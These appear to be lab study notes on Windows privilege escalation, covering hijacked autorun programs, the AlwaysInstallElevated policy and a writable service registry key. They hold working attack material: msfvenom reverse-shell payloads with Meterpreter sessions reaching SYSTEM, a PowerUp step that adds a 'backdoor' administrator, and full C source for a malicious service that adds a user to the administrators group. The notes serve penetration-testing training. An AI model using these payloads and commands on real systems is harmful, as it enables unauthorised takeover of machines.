
## Autorun

Windows normally has Autoruns enabled for instances such as plugging in a pen drive, inserting a CD, etc. We can abuse this to see whether there are any autoruns that has any permissions to allow us to elevate our privileges.

We can use the `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe` command to check for autoruns. This need a GUI to work.

![[Autoruns.png]]

If we pay look at the entries under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` (this is where Windows look for programs that should be automatically run), we notice there is a program named `My Program` running as an autorun. 

This can also be under the `HKCU` registry, which are programs that autorun only for the current user.

![[My Program.png]]

Once we have identified the program path, we can use another built-in tool named `accesscheck` to see which users have what type of access.

```PowerShell
C:\Users\user>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

We can see that everyone Read/Write permission to this file. So we can replace the file with a malicious payload that would run when an Administrator logs in.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o program.exe         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
Saved as: program.exe
```

Then we can transfer the file using a simple web server from our machine to the compromised machine. Now we just need to listen for a meterpreter connection.

When an administrator logs in they are automatically prompted to run the program, and we gain access to the machine as a privileged user.

![[Admin Prompt.png]]

```bash
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (177734 bytes) to 10.10.106.111
[*] Meterpreter session 2 opened (10.4.72.115:4444 -> 10.10.106.111:49261) at 2025-07-14 18:41:56 +1000

meterpreter > getuid 
Server username: TCM-PC\TCM
```


## AlwaysInstallElevated

Windows has packages called `msi` packages (generally windows installers), that can be automatically be installed elevated by setting a registry key. We can check the relevant registry and see whether the value is set for 1.

```PowerShell
C:\Users\user>reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

C:\Users\user>reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

We can see both `HKLM` (HKey Local Machine) and `HKCU` (HKey Current User) are set to 1. There are several ways we can exploit this.

### PowerUp.ps1

If we can run the `PowerUp.ps1` script, it will auto detect if these registry values are set to 1.

```PowerShell
C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

.
.

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI

.
.

PS C:\Users\user\Desktop\Tools\PowerUp> Write-UserAddMSI

OutputPath
----------
UserAdd.msi
```

This would create an `.msi` executable we can run to add a user to the Administrators group. When we run the executable, we see the following.

![[PowerUp UserAdd.png]]

We can check the administrators group and verify that we have successfully added the `backdoor` user to the group.

```PowerShell
C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
--------------------------------------------------------------------
Administrator
TCM
The command completed successfully.

C:\Users\user>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
--------------------------------------------------------------------
Administrator
backdoor
TCM
The command completed successfully.
```

### msfvenom

We can also manually exploit this by generating an `.msi`executable through `msfvenom` and transferring it over.

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 -f msi -o setup.msi                         
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of msi file: 159744 bytes
Saved as: setup.msi
```

When we run `setup.msi` on the compromised machine, we get the following and when Run is clicked, the meterpreter session is established. We can also run the command `msiexec /quiet /qn /i C:\Temp\setup.msi` to execute the setup file as well.

![[msfvenom payload.png]]

```bash
msf6 exploit(multi/handler) > sessions 

Active sessions
===============

No active sessions.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.4.72.115:4444 
[*] Sending stage (177734 bytes) to 10.10.106.111
[*] Meterpreter session 3 opened (10.4.72.115:4444 -> 10.10.106.111:49414) at 2025-07-14 20:25:31 +1000

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```


### Meterpreter

We can also use this method to gain an elevated shell if we have a low privilege shell in meterpreter.

```bash
msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options 

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.250    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows
```

## Vulnerable Service ACL

There might be vulnerable services located on a machine. We can check for these services by iterating through the `HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\` registry. `regsvc` is such a service on this machine. ^VulnService

```PowerShell
PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)
```

When we check the ACL for the service, we see that `NT AUTHORITY\INTERACTIVE Allow  FullControl` is set. Which means we have Full Control permission over the registry key. Hence, we can craft a malicious executable and change the `ImagePath` of the registry to the executable we crafted.

Below is the code of the executable we will be crafting. The important section is the `system` command. Which adds a user named user (**should exist in the machine**) to the administrators group. ^Executable

```C
$ cat windows_service.c
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
                Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
                        ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 
```

Once the file is created, we need to compile it to match the target architecture.

```bash
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

Now we can transfer the file to the machine over a simple HTTP server and save it in a directory we have write permission to. Once saved, we need to add the new path to the `ImagePath` value of the registry and start the service.

```PowerShell
C:\Users\user\Desktop>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\x.exe /f
The operation completed successfully.

C:\Users\user\Desktop>sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Temp\x.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user\Desktop\Tools\Source>sc start regsvc

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3496
        FLAGS              :

C:\Users\user\Desktop>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.
```
 
 Since the service is owned by `BUILTIN\Administrators`, it is run with the same permissions enabling us to add an user as an administrator.
 

